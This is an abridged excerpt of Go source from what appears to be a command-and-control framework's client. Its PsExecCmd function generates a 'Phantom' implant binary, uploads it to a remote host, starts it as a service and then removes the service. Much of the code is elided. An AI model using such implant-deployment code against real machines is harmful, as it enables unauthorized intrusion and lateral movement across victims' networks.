...
func PsExecCmd(cmd *cobra.Command, con *console.PhantomClient, args []string) {
	...
	if serviceName == "Phantom" || serviceDesc == "Phantom implant" {
	...
	if customExe == "" {
		...
		con.SpinUntil(fmt.Sprintf("Generating phantom binary for %s\n", profile), generateCtrl)
		...
		serviceBinary, _ = generate.GetPhantomBinary(implantProfile, con)
	} else {
		// use a custom exe instead of generating a new Phantom
	...
	upload, err := con.Rpc.Upload(context.Background(), &phantompb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
	...
	start, err := con.Rpc.StartService(context.Background(), &phantompb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            con.ActiveTarget.Request(cmd),
	...
	removed, err := con.Rpc.RemoveService(context.Background(), &phantompb.RemoveServiceReq{
		ServiceInfo: &phantompb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: con.ActiveTarget.Request(cmd),
